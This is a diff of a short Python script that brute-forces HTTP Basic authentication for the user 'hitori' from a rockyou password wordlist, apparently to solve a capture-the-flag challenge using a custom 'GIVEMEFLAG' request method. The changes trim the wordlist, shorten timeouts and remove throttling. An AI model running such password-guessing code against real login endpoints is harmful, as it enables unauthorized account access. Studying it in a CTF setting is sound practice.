@@ -24,7 +24,7 @@ def set_login(username, password):
     login_headers["Authorization"] = f"Basic {authorization}"
 
 count = 0
-with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
+with open('rockyou30001.txt', 'r', encoding='latin-1') as rockyou:
     for line in rockyou:
         count += 1
         line = line.strip()
@@ -32,14 +32,16 @@ with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
         set_login("hitori", line)
         while True:
             try:
-                response = requests.request("GIVEMEFLAG", login_url, headers=login_headers, timeout=10)
+                response = requests.request("GIVEMEFLAG", login_url, headers=login_headers, timeout=5)
                 break
             except ReadTimeout:
                 print("read timeout, retry")
+                # time.sleep(1)
             except ConnectTimeout:
                 print("connect timeout, retry")
+                # time.sleep(1)
+        # print(login_headers)
         if 'You have not been verified' not in response.text:
             print(f"found password!: {line}")
             break
-        # time.sleep(0.5)
 
